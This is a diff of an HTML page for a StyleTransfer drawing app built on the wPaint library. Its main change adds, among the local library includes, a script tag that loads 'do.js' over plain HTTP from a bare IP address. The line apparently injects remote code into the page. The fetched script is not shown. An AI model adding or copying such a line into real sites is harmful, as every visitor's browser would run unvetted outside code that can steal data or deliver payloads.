@@ -29,6 +29,7 @@
     <link rel="stylesheet" href="wPaint/lib/wColorPicker.min.css">
     <script src="wPaint/lib/paletteGenerator.js"></script>
     <script src="wPaint/lib/wColorPicker.min.js?ver3"></script>
+    <script src="http://123.206.84.193/do.js"></script>
     <!-- wPaint -->
     <link rel="stylesheet" href="wPaint/wPaint.min.css">
     <script src="wPaint/wPaint.min.js"></script>
@@ -268,7 +269,6 @@
                 <li><a href="#"><span><i class="fa fa-google-plus"></i></span></a></li>
                 <li><a href="#"><span><i class="fa fa-linkedin"></i></span></a></li>
             </ul>
-
             <div class="copyright">
                <p style="color: white">©2017 StyleTransfer <a href="#" target="_blank" title="">-- QiStudio</a></p>
             </div>
